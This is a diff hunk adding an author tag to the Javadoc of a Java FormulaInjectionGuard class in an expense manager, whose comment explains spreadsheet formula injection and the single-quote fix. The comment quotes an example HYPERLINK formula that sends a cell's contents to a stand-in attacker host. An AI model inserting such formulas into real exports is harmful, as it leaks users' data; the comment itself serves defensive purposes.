@@ -8,6 +8,8 @@ package com.family.expensemanager.common.report;
  * {@code =HYPERLINK("http://evil.example?"&A1,"Click")} or a DDE command. Prefixing a single quote is the
  * standard fix: every spreadsheet program renders the value as plain text starting with that character,
  * dropping the quote itself, and never evaluates it as a formula.
+ *
+ * @author boyquynhluu
  */
 public final class FormulaInjectionGuard {
 
